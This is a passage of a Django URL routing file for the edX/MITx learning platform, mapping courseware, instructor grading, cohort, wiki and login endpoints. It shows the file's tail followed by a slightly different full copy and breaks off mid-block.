        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book-shifted/(?P<page>[^/]*)$',
            'staticbook.views.index_shifted'),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$',                    
            'staticbook.views.pdf_index', name="pdf_book"),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',                    
            'staticbook.views.pdf_index'),                    

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',                    
            'staticbook.views.pdf_index'),                    
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$',                    
            'staticbook.views.pdf_index'),                    

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$',                    
            'staticbook.views.html_index', name="html_book"),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',                    
            'staticbook.views.html_index'),                    

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$',
            'courseware.views.index', name="courseware"),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/$',
            'courseware.views.index', name="courseware_chapter"),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/$',
            'courseware.views.index', name="courseware_section"),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/(?P<position>[^/]*)/?$',
            'courseware.views.index', name="courseware_position"),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress$',
            'courseware.views.progress', name="progress"),
        # Takes optional student_id for instructor use--shows profile as that student sees it.
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress/(?P<student_id>[^/]*)/$',
            'courseware.views.progress', name="student_progress"),

        # For the instructor
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/instructor$',
            'instructor.views.instructor_dashboard', name="instructor_dashboard"),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/gradebook$',
            'instructor.views.gradebook', name='gradebook'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/grade_summary$',
            'instructor.views.grade_summary', name='grade_summary'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading$',
            'open_ended_grading.views.staff_grading', name='staff_grading'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_next$',
            'open_ended_grading.staff_grading_service.get_next', name='staff_grading_get_next'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$',
            'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$',
            'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_problem_list$',
            'open_ended_grading.staff_grading_service.get_problem_list', name='staff_grading_get_problem_list'),

        # Open Ended problem list
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_problems$',
            'open_ended_grading.views.student_problem_list', name='open_ended_problems'),

        # Open Ended flagged problem list
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems$',
            'open_ended_grading.views.flagged_problem_list', name='open_ended_flagged_problems'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems/take_action_on_flags$',
            'open_ended_grading.views.take_action_on_flags', name='open_ended_flagged_problems_take_action'),

        # Cohorts management
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts$',
            'course_groups.views.list_cohorts', name="cohorts"),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/add$',
            'course_groups.views.add_cohort',
            name="add_cohort"),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)$',
            'course_groups.views.users_in_cohort',
            name="list_cohort"),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/add$',
            'course_groups.views.add_users_to_cohort',
            name="add_to_cohort"),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/delete$',
            'course_groups.views.remove_user_from_cohort',
            name="remove_from_cohort"),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/debug$',
            'course_groups.views.debug_cohort_mgmt',
            name="debug_cohort_mgmt"),

        # Open Ended Notifications
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_notifications$',
            'open_ended_grading.views.combined_notifications', name='open_ended_notifications'),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/peer_grading$',
            'open_ended_grading.views.peer_grading', name='peer_grading'),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes$', 'notes.views.notes', name='notes'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes/', include('notes.urls')),

    )

    # allow course staff to change to student view of courseware
    if settings.MITX_FEATURES.get('ENABLE_MASQUERADE'):
        urlpatterns += (
            url(r'^masquerade/(?P<marg>.*)$', 'courseware.masquerade.handle_ajax', name="masquerade-switch"),
        )

    # discussion forums live within courseware, so courseware must be enabled first
    if settings.MITX_FEATURES.get('ENABLE_DISCUSSION_SERVICE'):
        urlpatterns += (
            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/news$',
                'courseware.views.news', name="news"),
            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/discussion/',
                include('django_comment_client.urls'))
        )
    urlpatterns += (
        # This MUST be the last view in the courseware--it's a catch-all for custom tabs.
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/(?P<tab_slug>[^/]+)/$',
        'courseware.views.static_tab', name="static_tab"),
    )

    if settings.MITX_FEATURES.get('ENABLE_STUDENT_HISTORY_VIEW'):
        urlpatterns += (
            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/submission_history/(?P<student_username>[^/]*)/(?P<location>.*?)$',
                'courseware.views.submission_history',
                name='submission_history'),
        )


if settings.ENABLE_JASMINE:
    urlpatterns += (url(r'^_jasmine/', include('django_jasmine.urls')),)

if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'):
    ## Jasmine and admin
    urlpatterns += (url(r'^admin/', include(admin.site.urls)),)

if settings.MITX_FEATURES.get('AUTH_USE_OPENID'):
    urlpatterns += (
        url(r'^openid/login/$', 'django_openid_auth.views.login_begin', name='openid-login'),
        url(r'^openid/complete/$', 'external_auth.views.openid_login_complete', name='openid-complete'),
        url(r'^openid/logo.gif$', 'django_openid_auth.views.logo', name='openid-logo'),
    )

if settings.MITX_FEATURES.get('AUTH_USE_SHIB'):
    urlpatterns += (
        url(r'^shib-login/$', 'external_auth.views.shib_login', name='shib-login'),
    )

if settings.MITX_FEATURES.get('RESTRICT_ENROLL_BY_REG_METHOD'):
    urlpatterns += (
        url(r'^course_specific_login/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',
            'external_auth.views.course_specific_login', name='course-specific-login'),
        url(r'^course_specific_register/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',
            'external_auth.views.course_specific_register', name='course-specific-register'),

    )


if settings.MITX_FEATURES.get('AUTH_USE_OPENID_PROVIDER'):
    urlpatterns += (
        url(r'^openid/provider/login/$', 'external_auth.views.provider_login', name='openid-provider-login'),
        url(r'^openid/provider/login/(?:.+)$', 'external_auth.views.provider_identity', name='openid-provider-login-identity'),
        url(r'^openid/provider/identity/$', 'external_auth.views.provider_identity', name='openid-provider-identity'),
        url(r'^openid/provider/xrds/$', 'external_auth.views.provider_xrds', name='openid-provider-xrds')
    )

if settings.MITX_FEATURES.get('ENABLE_PEARSON_LOGIN', False):
    urlpatterns += url(r'^testcenter/login$', 'external_auth.views.test_center_login'),

if settings.MITX_FEATURES.get('ENABLE_LMS_MIGRATION'):
    urlpatterns += (
        url(r'^migrate/modules$', 'lms_migration.migrate.manage_modulestores'),
        url(r'^migrate/reload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.manage_modulestores'),
        url(r'^migrate/reload/(?P<reload_dir>[^/]+)/(?P<commit_id>[^/]+)$', 'lms_migration.migrate.manage_modulestores'),
        url(r'^gitreload$', 'lms_migration.migrate.gitreload'),
        url(r'^gitreload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.gitreload'),
    )

if settings.MITX_FEATURES.get('ENABLE_SQL_TRACKING_LOGS'):
    urlpatterns += (
        url(r'^event_logs$', 'track.views.view_tracking_log'),
        url(r'^event_logs/(?P<args>.+)$', 'track.views.view_tracking_log'),
    )

if settings.MITX_FEATURES.get('ENABLE_SERVICE_STATUS'):
    urlpatterns += (
        url(r'^status/', include('service_status.urls')),
    )

if settings.MITX_FEATURES.get('ENABLE_INSTRUCTOR_BACKGROUND_TASKS'):
    urlpatterns += (
        url(r'^instructor_task_status/$', 'instructor_task.views.instructor_task_status', name='instructor_task_status'),
    )

if settings.MITX_FEATURES.get('RUN_AS_ANALYTICS_SERVER_ENABLED'):
    urlpatterns += (
        url(r'^edinsights_service/', include('edinsights.core.urls')),
    )
    import edinsights.core.registry

# FoldIt views
urlpatterns += (
    # The path is hardcoded into their app...
    url(r'^comm/foldit_ops', 'foldit.views.foldit_ops', name="foldit_ops"),
)

if settings.MITX_FEATURES.get('ENABLE_DEBUG_RUN_PYTHON'):
    urlpatterns += (
        url(r'^debug/run_python', 'debug.views.run_python'),
    )

# Crowdsourced hinting instructor manager.
if settings.MITX_FEATURES.get('ENABLE_HINTER_INSTRUCTOR_VIEW'):
    urlpatterns += (
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/hint_manager$',
            'instructor.hint_manager.hint_manager', name="hint_manager"),
    )

urlpatterns = patterns(*urlpatterns)

if settings.DEBUG:
    urlpatterns += static(settings.STATIC_URL, document_root=settings.STATIC_ROOT)

#Custom error pages
handler404 = 'static_template_view.views.render_404'
handler500 = 'static_template_view.views.render_500'

from django.conf import settings
from django.conf.urls import patterns, include, url
from django.contrib import admin
from django.conf.urls.static import static

# Not used, the work is done in the imported module.
from . import one_time_startup      # pylint: disable=W0611

import django.contrib.auth.views

# Uncomment the next two lines to enable the admin:
if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'):
    admin.autodiscover()

urlpatterns = ('',  # nopep8
    # certificate view

    url(r'^update_certificate$', 'certificates.views.update_certificate'),
    url(r'^$', 'branding.views.index', name="root"),   # Main marketing page, or redirect to courseware
    url(r'^dashboard$', 'student.views.dashboard', name="dashboard"),
    url(r'^login$', 'student.views.signin_user', name="signin_user"),
    url(r'^register$', 'student.views.register_user', name="register_user"),

    url(r'^admin_dashboard$', 'dashboard.views.dashboard'),

    url(r'^change_email$', 'student.views.change_email_request', name="change_email"),
    url(r'^email_confirm/(?P<key>[^/]*)$', 'student.views.confirm_email_change'),
    url(r'^change_name$', 'student.views.change_name_request', name="change_name"),
    url(r'^accept_name_change$', 'student.views.accept_name_change'),
    url(r'^reject_name_change$', 'student.views.reject_name_change'),
    url(r'^pending_name_changes$', 'student.views.pending_name_changes'),
    url(r'^event$', 'track.views.user_track'),
    url(r'^t/(?P<template>[^/]*)$', 'static_template_view.views.index'),   # TODO: Is this used anymore? What is STATIC_GRAB?

    url(r'^accounts/login$', 'student.views.accounts_login', name="accounts_login"),

    url(r'^login_ajax$', 'student.views.login_user', name="login"),
    url(r'^login_ajax/(?P<error>[^/]*)$', 'student.views.login_user'),
    url(r'^logout$', 'student.views.logout_user', name='logout'),
    url(r'^create_account$', 'student.views.create_account', name='create_account'),
    url(r'^activate/(?P<key>[^/]*)$', 'student.views.activate_account', name="activate"),

    url(r'^begin_exam_registration/(?P<course_id>[^/]+/[^/]+/[^/]+)$', 'student.views.begin_exam_registration', name="begin_exam_registration"),
    url(r'^create_exam_registration$', 'student.views.create_exam_registration'),

    url(r'^password_reset/$', 'student.views.password_reset', name='password_reset'),
    ## Obsolete Django views for password resets
    ## TODO: Replace with Mako-ized views
    url(r'^password_change/$', django.contrib.auth.views.password_change,
        name='auth_password_change'),
    url(r'^password_change_done/$', django.contrib.auth.views.password_change_done,
        name='auth_password_change_done'),
    url(r'^password_reset_confirm/(?P<uidb36>[0-9A-Za-z]+)-(?P<token>.+)/$',
        'student.views.password_reset_confirm_wrapper',
        name='auth_password_reset_confirm'),
    url(r'^password_reset_complete/$', django.contrib.auth.views.password_reset_complete,
        name='auth_password_reset_complete'),
    url(r'^password_reset_done/$', django.contrib.auth.views.password_reset_done,
        name='auth_password_reset_done'),

    url(r'^heartbeat$', include('heartbeat.urls')),
)

# University profiles only make sense in the default edX context
if not settings.MITX_FEATURES["USE_CUSTOM_THEME"]:
    urlpatterns += (
        ##
        ## Only universities without courses should be included here.  If
        ## courses exist, the dynamic profile rule below should win.
        ##
        url(r'^(?i)university_profile/WellesleyX$', 'courseware.views.static_university_profile',
            name="static_university_profile", kwargs={'org_id': 'WellesleyX'}),
        url(r'^(?i)university_profile/McGillX$', 'courseware.views.static_university_profile',
            name="static_university_profile", kwargs={'org_id': 'McGillX'}),
        url(r'^(?i)university_profile/TorontoX$', 'courseware.views.static_university_profile',
            name="static_university_profile", kwargs={'org_id': 'TorontoX'}),
        url(r'^(?i)university_profile/RiceX$', 'courseware.views.static_university_profile',
            name="static_university_profile", kwargs={'org_id': 'RiceX'}),
        url(r'^(?i)university_profile/ANUx$', 'courseware.views.static_university_profile',
            name="static_university_profile", kwargs={'org_id': 'ANUx'}),
        url(r'^(?i)university_profile/EPFLx$', 'courseware.views.static_university_profile',
            name="static_university_profile", kwargs={'org_id': 'EPFLx'}),

        url(r'^university_profile/(?P<org_id>[^/]+)$', 'courseware.views.university_profile',
            name="university_profile"),
    )

#Semi-static views (these need to be rendered and have the login bar, but don't change)
urlpatterns += (
    url(r'^404$', 'static_template_view.views.render',
        {'template': '404.html'}, name="404"),
)

# Semi-static views only used by edX, not by themes
if not settings.MITX_FEATURES["USE_CUSTOM_THEME"]:
    urlpatterns += (
        url(r'^jobs$', 'static_template_view.views.render',
            {'template': 'jobs.html'}, name="jobs"),
        url(r'^press$', 'student.views.press', name="press"),
        url(r'^media-kit$', 'static_template_view.views.render',
            {'template': 'media-kit.html'}, name="media-kit"),
        url(r'^faq$', 'static_template_view.views.render',
            {'template': 'faq.html'}, name="faq_edx"),
        url(r'^help$', 'static_template_view.views.render',
            {'template': 'help.html'}, name="help_edx"),

        # TODO: (bridger) The copyright has been removed until it is updated for edX
        # url(r'^copyright$', 'static_template_view.views.render',
        #     {'template': 'copyright.html'}, name="copyright"),

        #Press releases
        url(r'^press/([_a-zA-Z0-9-]+)$', 'static_template_view.views.render_press_release', name='press_release'),

        # Favicon
        (r'^favicon\.ico$', 'django.views.generic.simple.redirect_to', {'url': '/static/images/favicon.ico'}),

        url(r'^submit_feedback$', 'util.views.submit_feedback'),

    )

# Only enable URLs for those marketing links actually enabled in the
# settings. Disable URLs by marking them as None.
for key, value in settings.MKTG_URL_LINK_MAP.items():
    # Skip disabled URLs
    if value is None:
        continue

    # These urls are enabled separately
    if key == "ROOT" or key == "COURSES" or key == "FAQ":
        continue

    # Make the assumptions that the templates are all in the same dir
    # and that they all match the name of the key (plus extension)
    template = "%s.html" % key.lower()

    # To allow theme templates to inherit from default templates,
    # prepend a standard prefix
    if settings.MITX_FEATURES["USE_CUSTOM_THEME"]:
        template = "theme-" + template

    # Make the assumption that the URL we want is the lowercased
    # version of the map key
    urlpatterns += (url(r'^%s' % key.lower(),
                        'static_template_view.views.render',
                        {'template': template}, name=value),)


if settings.PERFSTATS:
    urlpatterns += (url(r'^reprofile$', 'perfstats.views.end_profile'),)

# Multicourse wiki (Note: wiki urls must be above the courseware ones because of
# the custom tab catch-all)
if settings.WIKI_ENABLED:
    from wiki.urls import get_pattern as wiki_pattern
    from django_notify.urls import get_pattern as notify_pattern

    # Note that some of these urls are repeated in course_wiki.course_nav. Make sure to update
    # them together.
    urlpatterns += (
        # First we include views from course_wiki that we use to override the default views.
        # They come first in the urlpatterns so they get resolved first
        url('^wiki/create-root/$', 'course_wiki.views.root_create', name='root_create'),
        url(r'^wiki/', include(wiki_pattern())),
        url(r'^notify/', include(notify_pattern())),

        # These urls are for viewing the wiki in the context of a course. They should
        # never be returned by a reverse() so they come after the other url patterns
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/course_wiki/?$',
            'course_wiki.views.course_wiki_redirect', name="course_wiki"),
        url(r'^courses/(?:[^/]+/[^/]+/[^/]+)/wiki/', include(wiki_pattern())),
    )


if settings.COURSEWARE_ENABLED:
    urlpatterns += (
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/jump_to/(?P<location>.*)$',
            'courseware.views.jump_to', name="jump_to"),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/modx/(?P<location>.*?)/(?P<dispatch>[^/]*)$',
            'courseware.module_render.modx_dispatch',
            name='modx_dispatch'),


        # Software Licenses

        # TODO: for now, this is the endpoint of an ajax replay
        # service that retrieve and assigns license numbers for
        # software assigned to a course. The numbers have to be loaded
        # into the database.
        url(r'^software-licenses$', 'licenses.views.user_software_license', name="user_software_license"),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/xqueue/(?P<userid>[^/]*)/(?P<mod_id>.*?)/(?P<dispatch>[^/]*)$',
            'courseware.module_render.xqueue_callback',
            name='xqueue_callback'),
        url(r'^change_setting$', 'student.views.change_setting',
            name='change_setting'),

        # TODO: These views need to be updated before they work
        url(r'^calculate$', 'util.views.calculate'),
        # TODO: We should probably remove the circuit package. I believe it was only used in the old way of saving wiki circuits for the wiki
        # url(r'^edit_circuit/(?P<circuit>[^/]*)$', 'circuit.views.edit_circuit'),
        # url(r'^save_circuit/(?P<circuit>[^/]*)$', 'circuit.views.save_circuit'),

        url(r'^courses/?$', 'branding.views.courses', name="courses"),
        url(r'^change_enrollment$',
            'student.views.change_enrollment', name="change_enrollment"),

        #About the course
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/about$',
            'courseware.views.course_about', name="about_course"),
        #View for mktg site (kept for backwards compatibility TODO - remove before merge to master)
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/mktg-about$',
            'courseware.views.mktg_course_about', name="mktg_about_course"),
        #View for mktg site
        url(r'^mktg/(?P<course_id>.*)$',
            'courseware.views.mktg_course_about', name="mktg_about_course"),



        #Inside the course
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',
            'courseware.views.course_info', name="course_root"),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/info$',
            'courseware.views.course_info', name="info"),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$',
            'courseware.views.syllabus', name="syllabus"),   # TODO arjun remove when custom tabs in place, see courseware/courses.py
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$',                    
            'staticbook.views.index', name="book"),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',                    
            'staticbook.views.index'),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$',                    
            'staticbook.views.pdf_index', name="pdf_book"),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',                    
            'staticbook.views.pdf_index', name="pdf_book"),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',                    
            'staticbook.views.pdf_index', name="pdf_book"),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$',                    
            'staticbook.views.pdf_index', name="pdf_book"),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$',                    
            'staticbook.views.html_index', name="html_book"),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',                    
            'staticbook.views.html_index', name="html_book"),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$',
            'courseware.views.index', name="courseware"),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/$',
            'courseware.views.index', name="courseware_chapter"),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/$',
            'courseware.views.index', name="courseware_section"),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/(?P<position>[^/]*)/?$',
            'courseware.views.index', name="courseware_position"),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress$',
            'courseware.views.progress', name="progress"),
        # Takes optional student_id for instructor use--shows profile as that student sees it.
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress/(?P<student_id>[^/]*)/$',
            'courseware.views.progress', name="student_progress"),

        # For the instructor
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/instructor$',
            'instructor.views.instructor_dashboard', name="instructor_dashboard"),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/gradebook$',
            'instructor.views.gradebook', name='gradebook'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/grade_summary$',
            'instructor.views.grade_summary', name='grade_summary'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading$',
            'open_ended_grading.views.staff_grading', name='staff_grading'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_next$',
            'open_ended_grading.staff_grading_service.get_next', name='staff_grading_get_next'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$',
            'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$',
            'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_problem_list$',
            'open_ended_grading.staff_grading_service.get_problem_list', name='staff_grading_get_problem_list'),

        # Open Ended problem list
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_problems$',
            'open_ended_grading.views.student_problem_list', name='open_ended_problems'),

        # Open Ended flagged problem list
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems$',
            'open_ended_grading.views.flagged_problem_list', name='open_ended_flagged_problems'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems/take_action_on_flags$',
            'open_ended_grading.views.take_action_on_flags', name='open_ended_flagged_problems_take_action'),

        # Cohorts management
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts$',
            'course_groups.views.list_cohorts', name="cohorts"),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/add$',
            'course_groups.views.add_cohort',
            name="add_cohort"),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)$',
            'course_groups.views.users_in_cohort',
            name="list_cohort"),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/add$',
            'course_groups.views.add_users_to_cohort',
            name="add_to_cohort"),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/delete$',
            'course_groups.views.remove_user_from_cohort',
            name="remove_from_cohort"),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/debug$',
            'course_groups.views.debug_cohort_mgmt',
            name="debug_cohort_mgmt"),

        # Open Ended Notifications
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_notifications$',
            'open_ended_grading.views.combined_notifications', name='open_ended_notifications'),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/peer_grading$',
            'open_ended_grading.views.peer_grading', name='peer_grading'),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes$', 'notes.views.notes', name='notes'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes/', include('notes.urls')),

    )

    # allow course staff to change to student view of courseware
    if settings.MITX_FEATURES.get('ENABLE_MASQUERADE'):
        urlpatterns += (
            url(r'^masquerade/(?P<marg>.*)$', 'courseware.masquerade.handle_ajax', name="masquerade-switch"),
        )

    # discussion forums live within courseware, so courseware must be enabled first
    if settings.MITX_FEATURES.get('ENABLE_DISCUSSION_SERVICE'):
        urlpatterns += (
            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/news$',
                'courseware.views.news', name="news"),
            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/discussion/',
                include('django_comment_client.urls'))
        )
    urlpatterns += (
        # This MUST be the last view in the courseware--it's a catch-all for custom tabs.
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/(?P<tab_slug>[^/]+)/$',
        'courseware.views.static_tab', name="static_tab"),
    )

    if settings.MITX_FEATURES.get('ENABLE_STUDENT_HISTORY_VIEW'):
        urlpatterns += (
            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/submission_history/(?P<student_username>[^/]*)/(?P<location>.*?)$',
                'courseware.views.submission_history',
                name='submission_history'),
        )


if settings.ENABLE_JASMINE:
    urlpatterns += (url(r'^_jasmine/', include('django_jasmine.urls')),)

if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'):
    ## Jasmine and admin
    urlpatterns += (url(r'^admin/', include(admin.site.urls)),)

if settings.MITX_FEATURES.get('AUTH_USE_OPENID'):
    urlpatterns += (
        url(r'^openid/login/$', 'django_openid_auth.views.login_begin', name='openid-login'),
        url(r'^openid/complete/$', 'external_auth.views.openid_login_complete', name='openid-complete'),
        url(r'^openid/logo.gif$', 'django_openid_auth.views.logo', name='openid-logo'),
    )

if settings.MITX_FEATURES.get('AUTH_USE_SHIB'):
    urlpatterns += (
        url(r'^shib-login/$', 'external_auth.views.shib_login', name='shib-login'),
    )

if settings.MITX_FEATURES.get('RESTRICT_ENROLL_BY_REG_METHOD'):
    urlpatterns += (
        url(r'^course_specific_login/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',
            'external_auth.views.course_specific_login', name='course-specific-login'),
        url(r'^course_specific_register/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',
            'external_auth.views.course_specific_register', name='course-specific-register'),

    )


if settings.MITX_FEATURES.get('AUTH_USE_OPENID_PROVIDER'):
    urlpatterns += (
        url(r'^openid/provider/login/$', 'external_auth.views.provider_login', name='openid-provider-login'),
        url(r'^openid/provider/login/(?:.+)$', 'external_auth.views.provider_identity', name='openid-provider-login-identity'),
        url(r'^openid/provider/identity/$', 'external_auth.views.provider_identity', name='openid-provider-identity'),
        url(r'^openid/provider/xrds/$', 'external_auth.views.provider_xrds', name='openid-provider-xrds')
    )

if settings.MITX_FEATURES.get('ENABLE_PEARSON_LOGIN', False):
    urlpatterns += url(r'^testcenter/login$', 'external_auth.views.test_center_login'),

if settings.MITX_FEATURES.get('ENABLE_LMS_MIGRATION'):
    urlpatterns += (
        url(r'^migrate/modules$', 'lms_migration.migrate.manage_modulestores'),
        url(r'^migrate/reload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.manage_modulestores'),
        url(r'^migrate/reload/(?P<reload_dir>[^/]+)/(?P<commit_id>[^/]+)$', 'lms_migration.migrate.manage_modulestores'),
        url(r'^gitreload$', 'lms_migration.migrate.gitreload'),
        url(r'^gitreload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.gitreload'),
    )

if settings.MITX_FEATURES.get('ENABLE_SQL_TRACKING_LOGS'):
    urlpatterns += (
        url(r'^event_logs$', 'track.views.view_tracking_log'),
        url(r'^event_logs/(?P<args>.+)$', 'track.views.view_tracking_log'),
    )

if settings.MITX_FEATURES.get('ENABLE_SERVICE_STATUS'):
    urlpatterns += (
        url(r'^status/', include('service_status.urls')),
    )

if settings.MITX_FEATURES.get('ENABLE_INSTRUCTOR_BACKGROUND_TASKS'):
    urlpatterns += (
        url(r'^instructor_task_status/$', 'instructor_task.views.instructor_task_status', name='instructor_task_status'),
    )

if settings.MITX_FEATURES.get('RUN_AS_ANALYTICS_SERVER_ENABLED'):
